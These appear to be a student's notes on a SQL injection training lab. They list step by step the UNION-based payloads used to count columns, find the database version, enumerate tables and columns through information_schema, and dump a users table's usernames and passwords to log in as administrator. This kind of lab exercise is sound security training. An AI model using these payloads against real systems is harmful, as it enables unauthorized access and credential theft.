Lab #9 - SQL injection attack, listing the database contents on non Oracle databases

product category filter - SQLi vulnerable

End Goals:

- Determine the table that contains usernames and passwords
- Determine the relevant columns
- Output the contents of the table
- Login as the administrator user

Analysis:

1. Find the no. of columns
   ' order by 3--
   columns = 3-1 = 2

2. Find the columns with datatype 'string'
   ' union select 'a','a'--
   both columns are text/string

3. Find the version of the database
   ' union select version(),null--
   Postgresql Database

4. List the table names of the database
   ' UNION SELECT table_name,null FROM information_schema.tables--
   users_bznnwm

5. List the columns of desired table(users_bznnwm)
   ' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = 'users_bznnwm'--
   columns - username_yeyqiq, password_kwgtwn

6. List the contents of desired table(users_bznnwm)
   ' union select username_yeyqiq, password_kwgtwn from users_bznnwm--
